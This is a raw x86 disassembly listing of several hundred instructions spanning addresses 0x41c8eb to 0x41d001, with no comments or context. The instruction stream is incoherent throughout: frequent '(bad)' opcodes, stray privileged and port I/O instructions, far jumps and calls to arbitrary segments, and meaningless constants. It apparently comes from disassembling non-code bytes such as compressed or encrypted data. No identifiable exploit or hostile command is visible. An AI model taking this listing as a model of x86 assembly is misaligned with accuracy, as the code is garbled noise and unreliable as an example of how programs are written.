  41c8eb:	std    
  41c8ec:	jno    0x41c964
  41c8ee:	jecxz  0x41c8e2
  41c8f0:	shl    BYTE PTR [edx],cl
  41c8f2:	in     al,dx
  41c8f3:	aaa    
  41c8f4:	jno    0x41c8e7
  41c8f6:	test   esi,edx
  41c8f8:	dec    ecx
  41c8f9:	retf   0xe413
  41c8fc:	inc    ebp
  41c8fd:	aas    
  41c8fe:	xchg   ecx,eax
  41c8ff:	iret   
  41c900:	jecxz  0x41c978
  41c902:	imul   ebp,DWORD PTR [ebx-0x3d],0xaf29e09f
  41c909:	pop    ds
  41c90a:	jge    0x41c892
  41c90c:	push   cs
  41c90d:	jb     0x41c977
  41c90f:	shr    cl,1
  41c911:	sub    al,0x26
  41c913:	arpl   WORD PTR [eax],di
  41c915:	xchg   esi,eax
  41c916:	push   ecx
  41c917:	ss pop ss
  41c919:	mov    ecx,DWORD PTR [eax-0x5b]
  41c91c:	or     eax,0x2bc0919c
  41c921:	dec    esi
  41c922:	sub    ebp,DWORD PTR [ecx-0x307dcc5d]
  41c928:	int    0x8f
  41c92a:	adc    esi,DWORD PTR [ecx+0x6]
  41c92d:	jecxz  0x41c988
  41c92f:	add    DWORD PTR [ecx],ebp
  41c931:	aad    0x5c
  41c933:	addr16 inc eax
  41c935:	xchg   DWORD PTR [edx+edi*1],ebx
  41c938:	xor    BYTE PTR [eax],dl
  41c93a:	pop    ebp
  41c93b:	in     al,dx
  41c93c:	(bad)  
  41c93d:	scas   eax,DWORD PTR es:[edi]
  41c93e:	pushf  
  41c93f:	sub    BYTE PTR [esi+edi*4],cl
  41c942:	push   es
  41c943:	hlt    
  41c944:	sbb    esi,esp
  41c946:	dec    ebp
  41c947:	test   DWORD PTR [eax+0x3],esp
  41c94a:	clc    
  41c94b:	mov    edi,0xed2af431
  41c950:	inc    ecx
  41c951:	push   esi
  41c952:	mov    eax,0x844c354a
  41c957:	mov    eax,0x2cf25c9c
  41c95c:	pop    ds
  41c95d:	add    al,0x30
  41c95f:	loopne 0x41c9ad
  41c961:	dec    edx
  41c962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c963:	adc    BYTE PTR [ecx+edi*8],al
  41c966:	retf   0x6e49
  41c969:	push   ebp
  41c96a:	lahf   
  41c96b:	retf   
  41c96c:	icebp  
  41c96d:	(bad)  
  41c96e:	div    DWORD PTR [eax+0x6a]
  41c971:	sbb    ecx,DWORD PTR [edx+0x6]
  41c974:	scas   eax,DWORD PTR es:[edi]
  41c975:	adc    edi,DWORD PTR [ecx+0x471b6b94]
  41c97b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c97c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c97d:	shl    BYTE PTR [ebp+edx*1+0x3b],0x68
  41c982:	dec    ebx
  41c983:	daa    
  41c984:	mov    esp,0xff92ca6a
  41c989:	and    al,0x6d
  41c98b:	mov    ?,WORD PTR [ebx+0x20565cc2]
  41c991:	test   eax,0xe5b8ea0f
  41c996:	and    DWORD PTR [ebx],0x120ad0bc
  41c99c:	test   BYTE PTR [eax+0x38],bh
  41c99f:	sbb    al,0xc1
  41c9a1:	retf   0x4364
  41c9a4:	jno    0x41c93f
  41c9a6:	jl     0x41ca05
  41c9a8:	shr    bh,1
  41c9aa:	adc    eax,0x68066a99
  41c9af:	sub    ah,BYTE PTR [ebx+esi*2]
  41c9b2:	pusha  
  41c9b3:	icebp  
  41c9b4:	hlt    
  41c9b5:	(bad)  
  41c9b6:	int    0x89
  41c9b8:	xor    BYTE PTR [ebp+0x36],ah
  41c9bb:	(bad)  
  41c9bc:	pop    esp
  41c9bd:	jnp    0x41c98a
  41c9bf:	pop    ebx
  41c9c0:	adc    al,BYTE PTR [edi]
  41c9c2:	xor    DWORD PTR [ebx-0x5fe03829],0x74977597
  41c9cc:	repnz mov al,0x46
  41c9cf:	and    eax,0xd8e7d728
  41c9d4:	push   ebp
  41c9d5:	or     ebp,DWORD PTR [ecx]
  41c9d7:	outs   dx,BYTE PTR ds:[esi]
  41c9d8:	(bad)  
  41c9d9:	push   eax
  41c9da:	mov    WORD PTR [edx+0x5ec8b250],es
  41c9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e1:	lahf   
  41c9e2:	push   edi
  41c9e3:	stc    
  41c9e4:	lea    edi,[ecx+eax*1]
  41c9e7:	nop
  41c9e8:	xchg   edx,eax
  41c9e9:	scas   eax,DWORD PTR es:[edi]
  41c9ea:	mov    dh,0x8a
  41c9ec:	push   esp
  41c9ed:	loope  0x41c99a
  41c9ef:	shr    BYTE PTR [edi],cl
  41c9f1:	in     eax,dx
  41c9f2:	test   DWORD PTR [ebx+0x23],esp
  41c9f5:	jno    0x41ca41
  41c9f7:	fcom   QWORD PTR [edi-0x5865594a]
  41c9fd:	and    esi,DWORD PTR [ebx-0x15]
  41ca00:	sub    eax,0x6a3343a
  41ca05:	sti    
  41ca06:	cmp    BYTE PTR [edi+eax*2],dl
  41ca09:	icebp  
  41ca0a:	jle    0x41c9fc
  41ca0c:	outs   dx,BYTE PTR ds:[esi]
  41ca0d:	jecxz  0x41c9d2
  41ca0f:	in     al,dx
  41ca10:	subps  xmm5,XMMWORD PTR [ebp+eiz*4+0xae120ff]
  41ca18:	cwde   
  41ca19:	gs aam 0xed
  41ca1c:	push   edi
  41ca1d:	jp     0x41ca2b
  41ca1f:	pop    ebp
  41ca20:	fisttp QWORD PTR ds:0xf81dd2fe
  41ca26:	sbb    edx,edx
  41ca28:	inc    esp
  41ca29:	lock jp 0x41c9f2
  41ca2c:	fidiv  DWORD PTR [edx+0x3b]
  41ca2f:	sbb    DWORD PTR [eax+0x7c],edx
  41ca32:	imul   edx,DWORD PTR [edx+0x54c0932c],0x94f05c03
  41ca3c:	sahf   
  41ca3d:	dec    ecx
  41ca3e:	and    DWORD PTR [ebp-0x5],edi
  41ca41:	jge    0x41ca53
  41ca43:	mov    WORD PTR ds:0x21827b02,?
  41ca49:	jno    0x41c9f1
  41ca4b:	mov    edx,0x46ee12c7
  41ca50:	sbb    BYTE PTR [ebx],dl
  41ca52:	aas    
  41ca53:	js     0x41c9e3
  41ca55:	jg     0x41ca55
  41ca57:	ins    DWORD PTR es:[edi],dx
  41ca58:	sub    eax,0xab65cc9a
  41ca5d:	fwait
  41ca5e:	sub    al,0xe
  41ca60:	mov    eax,ds:0xd0e1ce0d
  41ca65:	les    edi,FWORD PTR [esi+0x12]
  41ca68:	outs   dx,BYTE PTR ds:[esi]
  41ca69:	xchg   DWORD PTR [eax],ebp
  41ca6b:	in     al,0x62
  41ca6d:	ss iret 
  41ca6f:	cld    
  41ca70:	xchg   esp,eax
  41ca71:	retf   0x94e1
  41ca74:	cdq    
  41ca75:	cdq    
  41ca76:	jnp    0x41ca8e
  41ca78:	jb     0x41ca06
  41ca7a:	xor    al,0x33
  41ca7c:	mov    ch,0xc8
  41ca7e:	sub    BYTE PTR [esi-0x34b13d36],bh
  41ca84:	loope  0x41ca76
  41ca86:	hlt    
  41ca87:	addr16 xchg ebx,eax
  41ca89:	fisub  WORD PTR [edi-0x7e]
  41ca8c:	ins    DWORD PTR es:[edi],dx
  41ca8d:	sbb    al,0x5e
  41ca8f:	retf   
  41ca90:	fiadd  DWORD PTR [edx-0x43]
  41ca93:	push   es
  41ca94:	cli    
  41ca95:	inc    DWORD PTR [esi-0x3ae935f7]
  41ca9b:	push   eax
  41ca9c:	int    0x7f
  41ca9e:	push   es
  41ca9f:	ins    BYTE PTR es:[edi],dx
  41caa0:	daa    
  41caa1:	and    DWORD PTR [edi+0x646f8624],ebx
  41caa7:	ds xchg ah,ch
  41caaa:	adc    eax,0x40cbd918
  41caaf:	fwait
  41cab0:	push   ss
  41cab1:	(bad)  
  41cab3:	ja     0x41cafa
  41cab5:	pop    esi
  41cab6:	aad    0x3c
  41cab8:	pop    ebx
  41cab9:	nop
  41caba:	jmp    0x7aa63c2d
  41cabf:	lods   eax,DWORD PTR gs:[esi]
  41cac1:	lods   al,BYTE PTR ds:[esi]
  41cac2:	add    al,0xf4
  41cac4:	int    0x21
  41cac6:	and    BYTE PTR [esi+esi*4+0x76],dl
  41caca:	sub    eax,0x30a7e8c3
  41cacf:	sub    esi,DWORD PTR [ecx-0x7a2969e9]
  41cad5:	adc    al,0xee
  41cad7:	xchg   edx,eax
  41cad8:	jmp    0x41cad5
  41cada:	or     dh,bh
  41cadc:	jno    0x41cb41
  41cade:	push   ebx
  41cadf:	in     al,dx
  41cae0:	mov    ds:0xb87c309f,eax
  41cae5:	push   ss
  41cae6:	pop    esp
  41cae7:	adc    eax,0xcc11ad8a
  41caec:	lods   al,BYTE PTR ds:[esi]
  41caed:	or     BYTE PTR [ebp+esi*4+0x1e],ch
  41caf1:	sub    bh,BYTE PTR [edi-0x6e]
  41caf4:	mov    edx,0x462a356d
  41caf9:	sub    edi,ecx
  41cafb:	rol    bl,0x7b
  41cafe:	test   edx,0x8c586225
  41cb04:	sub    ebx,DWORD PTR [ebx]
  41cb06:	xchg   DWORD PTR gs:0xcb0d4cc4,eax
  41cb0d:	fild   DWORD PTR [ebp+0x2be6de18]
  41cb13:	pop    ds
  41cb14:	xchg   ebx,eax
  41cb15:	mov    bh,cl
  41cb17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb18:	inc    esi
  41cb19:	mov    eax,0x4ce08b59
  41cb1e:	call   DWORD PTR [edi+0x3a]
  41cb21:	sahf   
  41cb22:	int    0x8e
  41cb24:	(bad)  
  41cb25:	push   eax
  41cb26:	icebp  
  41cb27:	mov    edi,0x183befc5
  41cb2c:	test   al,0x2f
  41cb2e:	push   ebx
  41cb2f:	mov    ebx,DWORD PTR [ebx+eiz*1]
  41cb32:	mov    ds:0x11086718,al
  41cb37:	gs (bad) 
  41cb39:	xor    dl,BYTE PTR [esi+0x452fece7]
  41cb3f:	shr    BYTE PTR [ebx],cl
  41cb41:	and    esi,DWORD PTR [esi-0x19]
  41cb44:	mov    eax,ds:0xec184dde
  41cb49:	fs mov ecx,0x88a44078
  41cb4f:	or     BYTE PTR [eax-0xf],ah
  41cb52:	pop    ebx
  41cb53:	xor    BYTE PTR [esi],ah
  41cb55:	sbb    dl,0x64
  41cb58:	call   0xe51bdaff
  41cb5d:	dec    edx
  41cb5e:	pop    ds
  41cb5f:	add    ebp,esi
  41cb61:	(bad)  
  41cb62:	mov    edi,0xbcb170f
  41cb67:	xor    eax,0x92321b65
  41cb6c:	inc    ebx
  41cb6d:	fisttp WORD PTR [ecx]
  41cb6f:	call   0x99de:0xad553a35
  41cb76:	sar    BYTE PTR [eax-0x26],1
  41cb79:	shr    DWORD PTR [ebp+0x0],cl
  41cb7c:	push   ebx
  41cb7d:	xor    al,BYTE PTR [edx+0x55479e4d]
  41cb83:	fucomip st,st(2)
  41cb85:	jl     0x41cbe8
  41cb87:	mov    ds:0xc4a6b507,al
  41cb8c:	add    al,0x43
  41cb8e:	sub    DWORD PTR [ebx+0x73e80614],0x6a
  41cb95:	mov    DWORD PTR [esp+eiz*4-0x3e3b6ea5],0x6c6265c7
  41cba0:	mov    ebp,0x22cdcc01
  41cba5:	lahf   
  41cba6:	sub    DWORD PTR [edx-0x197aac72],ebp
  41cbac:	aas    
  41cbad:	test   eax,0x64606eb6
  41cbb2:	mov    WORD PTR [edi-0x28],es
  41cbb5:	imul   ecx
  41cbb7:	fwait
  41cbb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbb9:	sbb    DWORD PTR [esi-0x1099df66],ebx
  41cbbf:	jge    0x41cbe0
  41cbc1:	fsub   DWORD PTR [eax-0x1316a5f9]
  41cbc7:	add    eax,0x8ea10ef2
  41cbcc:	aas    
  41cbcd:	(bad)  
  41cbce:	ror    DWORD PTR ss:[edi],1
  41cbd1:	push   esi
  41cbd2:	pop    edx
  41cbd3:	clc    
  41cbd4:	fcomp  DWORD PTR [ecx+ecx*4]
  41cbd7:	lods   eax,DWORD PTR ds:[esi]
  41cbd8:	std    
  41cbd9:	sbb    al,0xfc
  41cbdb:	scas   eax,DWORD PTR es:[edi]
  41cbdc:	into   
  41cbdd:	push   edi
  41cbde:	outs   dx,BYTE PTR ds:[esi]
  41cbdf:	das    
  41cbe0:	push   edi
  41cbe1:	cld    
  41cbe2:	or     al,0xd8
  41cbe4:	ja     0x41cc4d
  41cbe6:	call   0x9d25b4a8
  41cbeb:	and    eax,0x238933b
  41cbf0:	arpl   WORD PTR [ebx+ebp*1-0x40af265d],di
  41cbf7:	iret   
  41cbf8:	and    cl,BYTE PTR [ebx]
  41cbfa:	outs   dx,BYTE PTR ds:[esi]
  41cbfb:	aas    
  41cbfc:	test   cl,cl
  41cbfe:	lods   eax,DWORD PTR ds:[esi]
  41cbff:	or     BYTE PTR [ecx],dh
  41cc01:	xor    eax,0x907a8fc5
  41cc06:	int3   
  41cc07:	ss mov cl,0x99
  41cc0a:	and    eax,0x81d09653
  41cc0f:	pop    ecx
  41cc10:	xchg   edx,eax
  41cc11:	mov    edi,0x4aef70d6
  41cc16:	adc    cl,BYTE PTR [eax-0x5f4d994e]
  41cc1c:	test   WORD PTR [esi+0x671c63c9],bp
  41cc23:	cmp    al,0x55
  41cc25:	popa   
  41cc26:	stos   DWORD PTR es:[edi],eax
  41cc27:	lods   eax,DWORD PTR ds:[esi]
  41cc28:	loop   0x41cbc7
  41cc2a:	bts    DWORD PTR [edx],edi
  41cc2d:	enter  0xb413,0x55
  41cc31:	ror    BYTE PTR [edx-0x26a3a439],cl
  41cc37:	lock or BYTE PTR [ebx-0x16],bh
  41cc3b:	pop    edx
  41cc3c:	add    BYTE PTR [eax],dh
  41cc3e:	sbb    al,0x85
  41cc40:	adc    bh,BYTE PTR [eax+0x5bbdc5c1]
  41cc46:	sbb    BYTE PTR [ecx-0x48b01f55],0x46
  41cc4d:	imul   esp,edx,0x95312f1
  41cc53:	jmp    0x9139cd00
  41cc58:	dec    esi
  41cc59:	inc    eax
  41cc5a:	pop    edx
  41cc5b:	jg     0x41cc24
  41cc5d:	add    al,0xb5
  41cc5f:	pop    ds
  41cc60:	sub    dh,ah
  41cc62:	add    al,cl
  41cc64:	mov    dh,0xf6
  41cc66:	jns    0x41cc19
  41cc68:	xor    edx,DWORD PTR ds:0xb039365f
  41cc6e:	jae    0x41cc50
  41cc70:	mov    cl,0x6f
  41cc72:	pop    esp
  41cc73:	dec    ecx
  41cc74:	pop    ds
  41cc75:	xchg   BYTE PTR [esi-0x3d3b0a9d],bh
  41cc7b:	adc    eax,0xebb54857
  41cc80:	jecxz  0x41cc93
  41cc82:	jmp    0x60f5:0x59bc857b
  41cc89:	jnp    0x41ccae
  41cc8b:	nop
  41cc8c:	sahf   
  41cc8d:	js     0x41cc38
  41cc8f:	or     al,0x7d
  41cc91:	dec    esi
  41cc92:	xchg   esp,eax
  41cc93:	div    BYTE PTR [eax+0x78dfd90c]
  41cc99:	pop    esp
  41cc9a:	sub    eax,0x732b2a68
  41cc9f:	pop    edi
  41cca0:	mov    ds:0xd629b6df,al
  41cca5:	das    
  41cca6:	adc    BYTE PTR [eax+ebp*2-0x7c],bh
  41ccaa:	shl    BYTE PTR [ebx],0x4f
  41ccad:	mov    dh,0xdf
  41ccaf:	push   esp
  41ccb0:	mov    al,0x91
  41ccb2:	popf   
  41ccb3:	jns    0x41ccf8
  41ccb5:	(bad)  
  41ccb6:	popa   
  41ccb7:	fisub  WORD PTR [edx-0x18c34f79]
  41ccbd:	pop    ds
  41ccbe:	jno    0x41ccd2
  41ccc0:	jne    0x41ccc0
  41ccc2:	mov    edi,0x10f6f7eb
  41ccc7:	cdq    
  41ccc8:	jl     0x41cc63
  41ccca:	push   edi
  41cccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cccc:	les    esp,FWORD PTR [edx]
  41ccce:	sbb    dl,BYTE PTR [edx+0x73]
  41ccd1:	mov    ebp,0x91777d71
  41ccd6:	sbb    edx,edi
  41ccd8:	aam    0x32
  41ccda:	and    al,0x20
  41ccdc:	pop    esp
  41ccdd:	pushf  
  41ccde:	retf   0xa039
  41cce1:	push   eax
  41cce2:	add    edi,DWORD PTR [edx]
  41cce4:	mul    DWORD PTR [ecx]
  41cce6:	(bad)  
  41cce7:	jbe    0x41ccc0
  41cce9:	das    
  41ccea:	call   0xe8a17441
  41ccef:	test   esi,edx
  41ccf1:	and    DWORD PTR [eax-0x23],esp
  41ccf4:	mov    bh,0xb1
  41ccf6:	arpl   cx,cx
  41ccf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccf9:	scas   al,BYTE PTR es:[edi]
  41ccfa:	xchg   edi,eax
  41ccfb:	and    DWORD PTR [eax-0x76],eax
  41ccfe:	inc    edx
  41ccff:	sub    al,0xc8
  41cd01:	xchg   esp,eax
  41cd02:	pop    esi
  41cd03:	test   DWORD PTR [esi-0x1a3ae488],eax
  41cd09:	mov    esp,0xf67c65ad
  41cd0e:	aaa    
  41cd0f:	bswap  edi
  41cd11:	inc    ecx
  41cd12:	xor    al,0x14
  41cd14:	mov    eax,ds:0xd3b7f7c5
  41cd19:	jg     0x41cd63
  41cd1b:	xor    edi,DWORD PTR [eax-0x41d96fa4]
  41cd21:	and    BYTE PTR [edi-0x3f],0xd3
  41cd25:	outs   dx,DWORD PTR ds:[esi]
  41cd26:	nop
  41cd27:	(bad)  
  41cd28:	sub    al,0x47
  41cd2a:	std    
  41cd2b:	sub    DWORD PTR [ebp-0x74],ebx
  41cd2e:	xor    bl,dh
  41cd30:	sub    al,0xe1
  41cd32:	xor    al,0xac
  41cd34:	or     cl,bh
  41cd36:	leave  
  41cd37:	mov    ebp,0x53957d01
  41cd3c:	jne    0x41cd5b
  41cd3e:	(bad)  
  41cd40:	(bad)  
  41cd41:	lahf   
  41cd42:	cmc    
  41cd43:	mul    DWORD PTR [esi+ebx*1+0x65]
  41cd47:	push   0xffffffaa
  41cd49:	loop   0x41cd18
  41cd4b:	inc    edx
  41cd4c:	or     esp,DWORD PTR [eax+0xb]
  41cd4f:	shl    BYTE PTR [ebx+0x5b5c0305],1
  41cd55:	add    DWORD PTR [ebp-0x39],0xb3611d93
  41cd5c:	push   ebp
  41cd5d:	jp     0x41cced
  41cd5f:	xor    ecx,DWORD PTR ds:0x4bf8c660
  41cd65:	pop    ebx
  41cd66:	dec    edx
  41cd67:	into   
  41cd68:	pushf  
  41cd69:	call   0x1807aeb6
  41cd6e:	fs push ss
  41cd70:	sub    cl,cl
  41cd72:	or     al,0x6
  41cd74:	popa   
  41cd75:	xchg   esp,eax
  41cd76:	push   edi
  41cd77:	sub    dh,BYTE PTR [eax-0x396a3668]
  41cd7d:	mov    ch,0x8c
  41cd7f:	fidiv  DWORD PTR [edi-0x298a0005]
  41cd85:	sub    ah,BYTE PTR [ebx+edi*1]
  41cd88:	mov    cl,0x30
  41cd8a:	xchg   ecx,eax
  41cd8b:	jnp    0x41cd28
  41cd8d:	adc    al,0x9b
  41cd8f:	jae    0x41cda5
  41cd91:	cmp    DWORD PTR [ebx+0x5],edi
  41cd94:	fnstsw WORD PTR [esi+0x745f4771]
  41cd9a:	scas   al,BYTE PTR es:[edi]
  41cd9b:	pop    ebx
  41cd9c:	push   0xffffff9f
  41cd9e:	ins    BYTE PTR es:[edi],dx
  41cd9f:	jle    0x41cd4a
  41cda1:	test   ah,al
  41cda3:	aaa    
  41cda4:	xchg   edi,eax
  41cda5:	adc    ecx,0xfffffffd
  41cda8:	int    0x0
  41cdaa:	stc    
  41cdab:	fs jae 0x41cd92
  41cdae:	jl     0x41cd4a
  41cdb0:	(bad)  
  41cdb1:	mov    dh,0xe3
  41cdb3:	(bad)  
  41cdb4:	ret    0xfd2c
  41cdb7:	icebp  
  41cdb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdb9:	arpl   sp,di
  41cdbb:	mov    WORD PTR [ecx-0x3e],fs
  41cdbe:	cwde   
  41cdbf:	sbb    esp,DWORD PTR [eax+0x41]
  41cdc2:	xchg   edi,eax
  41cdc3:	pushf  
  41cdc4:	xchg   BYTE PTR [ecx-0x2f],dh
  41cdc7:	data16 jg 0x41cddc
  41cdca:	(bad)  
  41cdcd:	xchg   ecx,eax
  41cdce:	jo     0x41ce45
  41cdd0:	fbld   TBYTE PTR [esi-0x46bffe4f]
  41cdd6:	retf   0xaf76
  41cdd9:	jge    0x41cd6e
  41cddb:	fisubr WORD PTR [eax-0x71]
  41cdde:	std    
  41cddf:	out    0xf4,al
  41cde1:	or     eax,0x99271d36
  41cde6:	push   esp
  41cde7:	imul   eax,DWORD PTR [edi],0xffffff9a
  41cdea:	inc    ebx
  41cdeb:	loopne 0x41ce27
  41cded:	push   ss
  41cdee:	rol    BYTE PTR [eax-0x34406670],0x6f
  41cdf5:	rol    BYTE PTR [esi+0x4d],cl
  41cdf8:	pop    esi
  41cdf9:	imul   esi,esp,0x6fb7befb
  41cdff:	fdiv   QWORD PTR [edx-0x4333dc48]
  41ce05:	xchg   esi,eax
  41ce06:	inc    esi
  41ce07:	iret   
  41ce08:	gs dec ebp
  41ce0a:	jnp    0x41cda1
  41ce0c:	outs   dx,DWORD PTR ds:[esi]
  41ce0d:	out    0xb9,al
  41ce0f:	dec    edi
  41ce10:	xchg   edx,eax
  41ce11:	and    bh,0xdf
  41ce14:	fstp   TBYTE PTR [ebx+0x41]
  41ce17:	mov    ds:0x8fb3dc2c,al
  41ce1c:	or     al,0x21
  41ce1e:	or     eax,0xf4b1b226
  41ce23:	inc    eax
  41ce24:	pushf  
  41ce25:	fild   QWORD PTR [ebp+0x226ebc53]
  41ce2b:	sub    DWORD PTR [edi-0x5adeebdc],edx
  41ce31:	lahf   
  41ce32:	and    al,ch
  41ce34:	cmp    DWORD PTR [esp+edx*4-0x263f0a5e],esp
  41ce3b:	inc    edi
  41ce3c:	dec    esi
  41ce3d:	sbb    DWORD PTR [eax+0x76],ebx
  41ce40:	outs   dx,DWORD PTR ds:[esi]
  41ce41:	(bad)  
  41ce42:	call   0x4d4e:0xa3985c27
  41ce49:	pop    esp
  41ce4a:	jae    0x41cded
  41ce4c:	add    BYTE PTR [edi+0x5aa60d2b],al
  41ce52:	mov    ds:0x94e89b12,eax
  41ce57:	and    dl,BYTE PTR [ebx-0x6809ae4d]
  41ce5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce5e:	nop
  41ce5f:	mov    esi,0xbb96372e
  41ce64:	xchg   BYTE PTR [bx+si+0x30d5],cl
  41ce69:	push   esp
  41ce6a:	and    ecx,eax
  41ce6c:	test   BYTE PTR [esi-0x55],cl
  41ce6f:	sub    bh,BYTE PTR [eax+0x67]
  41ce72:	or     al,0xef
  41ce74:	xchg   ecx,eax
  41ce75:	push   0x1c
  41ce77:	idiv   BYTE PTR [ebx+0x16]
  41ce7a:	xchg   esp,eax
  41ce7b:	ins    DWORD PTR es:[edi],dx
  41ce7c:	add    al,0xf3
  41ce7e:	pop    eax
  41ce7f:	gs out dx,al
  41ce81:	popf   
  41ce82:	mov    ch,0x2a
  41ce84:	stos   BYTE PTR es:[edi],al
  41ce85:	pop    ds
  41ce86:	stos   BYTE PTR es:[edi],al
  41ce87:	pushf  
  41ce88:	add    ebx,DWORD PTR [eax+ebx*1]
  41ce8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce8c:	sub    eax,0xb5893b0
  41ce91:	push   ds
  41ce92:	in     al,dx
  41ce93:	add    al,BYTE PTR [edx+0x34]
  41ce96:	(bad)  
  41ce97:	fstp   TBYTE PTR [ebx-0x29b5c94e]
  41ce9d:	cli    
  41ce9e:	cwde   
  41ce9f:	test   al,0xb2
  41cea1:	cmp    eax,0xbf5cbdf1
  41cea6:	xor    ch,ch
  41cea8:	iret   
  41cea9:	cmp    al,0x8e
  41ceab:	mov    al,ds:0xa5c47827
  41ceb0:	push   ecx
  41ceb1:	(bad)  
  41ceb3:	push   esp
  41ceb4:	shl    ebx,0xf0
  41ceb7:	push   edx
  41ceb8:	inc    ecx
  41ceb9:	xor    edi,eax
  41cebb:	fchs   
  41cebd:	add    BYTE PTR [ebp+eax*1-0x6e271c44],al
  41cec4:	jp     0x41ce61
  41cec6:	loopne 0x41cef4
  41cec8:	or     ebp,DWORD PTR [ebp-0x61dc0d90]
  41cece:	rcl    ch,cl
  41ced0:	loope  0x41ceb0
  41ced2:	add    BYTE PTR [edi],ch
  41ced4:	fs scas eax,DWORD PTR es:[edi]
  41ced6:	push   eax
  41ced7:	pop    eax
  41ced8:	jge    0x41ce70
  41ceda:	dec    esp
  41cedb:	int3   
  41cedc:	mov    cl,0x98
  41cede:	inc    edi
  41cedf:	out    dx,eax
  41cee0:	ja     0x41cf4f
  41cee2:	(bad)  
  41cee3:	mov    ah,0x33
  41cee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cee6:	fist   WORD PTR [eax+eiz*4+0x9]
  41ceea:	(bad)  
  41ceeb:	push   esi
  41ceec:	popa   
  41ceed:	jmp    0x5124:0x324d24f0
  41cef4:	(bad)  
  41cef5:	push   0x5580ca5
  41cefa:	daa    
  41cefb:	lock imul edi,ebx,0xbee48f3f
  41cf02:	dec    edi
  41cf03:	cmp    ebx,edi
  41cf05:	or     eax,0x6125ea1c
  41cf0a:	mov    BYTE PTR [edi+0x35],bh
  41cf0d:	mov    bh,0x35
  41cf0f:	aad    0x24
  41cf11:	clc    
  41cf12:	daa    
  41cf13:	test   al,0x9c
  41cf15:	popa   
  41cf16:	add    DWORD PTR [ecx+ebx*4],edi
  41cf19:	ror    edx,1
  41cf1b:	js     0x41cecf
  41cf1d:	mov    al,ds:0xa7987956
  41cf22:	inc    ecx
  41cf23:	mov    ds:0x2eddffce,al
  41cf28:	dec    eax
  41cf29:	lock jo 0x41cf12
  41cf2c:	pop    ebx
  41cf2d:	das    
  41cf2e:	enter  0x2700,0xfd
  41cf32:	sbb    al,0x50
  41cf34:	or     al,0xa9
  41cf36:	fild   DWORD PTR [edx]
  41cf38:	pop    ss
  41cf39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf3a:	push   0x3ce68aa2
  41cf3f:	pusha  
  41cf40:	add    BYTE PTR [eax+eax*4],bh
  41cf43:	push   edi
  41cf44:	iret   
  41cf45:	in     al,0xe
  41cf47:	repz push ebx
  41cf49:	dec    edx
  41cf4a:	nop
  41cf4b:	add    ebx,esp
  41cf4d:	lods   eax,DWORD PTR ds:[esi]
  41cf4e:	daa    
  41cf4f:	pop    ss
  41cf50:	loopne 0x41cf2a
  41cf52:	jmp    0x84fb4ed5
  41cf57:	stos   BYTE PTR es:[edi],al
  41cf58:	jnp    0x41cfb9
  41cf5a:	int3   
  41cf5b:	xlat   BYTE PTR ds:[ebx]
  41cf5c:	outs   dx,DWORD PTR ds:[esi]
  41cf5d:	inc    ecx
  41cf5e:	mov    edi,ebx
  41cf60:	pop    edx
  41cf61:	xchg   esi,eax
  41cf62:	xchg   edx,eax
  41cf63:	repnz stos BYTE PTR es:[edi],al
  41cf65:	and    al,BYTE PTR [edx+0x77]
  41cf68:	or     ch,BYTE PTR [esi-0x1c28d4a]
  41cf6e:	rcr    BYTE PTR [ecx+0x6d],0xf8
  41cf72:	jno    0x41cf5a
  41cf74:	rol    BYTE PTR [ebp+0x60],cl
  41cf77:	das    
  41cf78:	lods   eax,DWORD PTR ds:[esi]
  41cf79:	out    dx,eax
  41cf7a:	outs   dx,DWORD PTR ds:[esi]
  41cf7b:	sbb    DWORD PTR [esi],edx
  41cf7d:	mov    dh,0xf0
  41cf7f:	inc    esi
  41cf80:	cmp    dh,dh
  41cf82:	(bad)
  41cf86:	(bad)  
  41cf87:	pop    esi
  41cf88:	sbb    dh,dh
  41cf8a:	leave  
  41cf8b:	jne    0x41cfa4
  41cf8d:	dec    edi
  41cf8e:	mov    esp,0x6470359a
  41cf93:	xor    DWORD PTR [ecx-0x1968d8a8],edx
  41cf99:	(bad)  
  41cf9a:	push   edi
  41cf9b:	inc    ebp
  41cf9c:	sbb    eax,DWORD PTR [ecx+esi*2-0x5b]
  41cfa0:	repnz dec edi
  41cfa2:	sub    al,0xeb
  41cfa4:	xor    eax,0x17de8283
  41cfa9:	and    edx,0xc0be87e3
  41cfaf:	ins    DWORD PTR es:[edi],dx
  41cfb0:	pop    ss
  41cfb1:	mov    eax,0x4d7a99ac
  41cfb6:	lods   eax,DWORD PTR ds:[esi]
  41cfb7:	xchg   edx,eax
  41cfb8:	imul   ebp,DWORD PTR [edi+0x17],0xd5800fdf
  41cfbf:	pusha  
  41cfc0:	out    0x69,al
  41cfc2:	lahf   
  41cfc3:	inc    edx
  41cfc4:	inc    DWORD PTR [ebx-0x23]
  41cfc7:	adc    dh,cl
  41cfc9:	inc    esi
  41cfca:	and    BYTE PTR [ecx],bh
  41cfcc:	call   0xfe495c7e
  41cfd1:	push   esp
  41cfd2:	lods   al,BYTE PTR ds:[esi]
  41cfd3:	aad    0x86
  41cfd5:	mov    esi,0x22de5c2e
  41cfda:	sbb    ebp,ebp
  41cfdc:	push   edx
  41cfdd:	add    eax,0x74ae5c84
  41cfe2:	jns    0x41cf6b
  41cfe4:	(bad)  
  41cfe6:	adc    eax,0xe4db8683
  41cfeb:	dec    edi
  41cfec:	mov    es,WORD PTR [edi-0x42]
  41cfef:	jecxz  0x41cff2
  41cff1:	fs xchg ebx,eax
  41cff3:	out    dx,eax
  41cff4:	daa    
  41cff5:	stos   DWORD PTR es:[edi],eax
  41cff6:	mov    ebx,0x96ee710f
  41cffb:	adc    DWORD PTR [ebx+0x329d27e6],edx
  41d001:	fidiv  DWORD PTR [ecx-0x6426dddb]
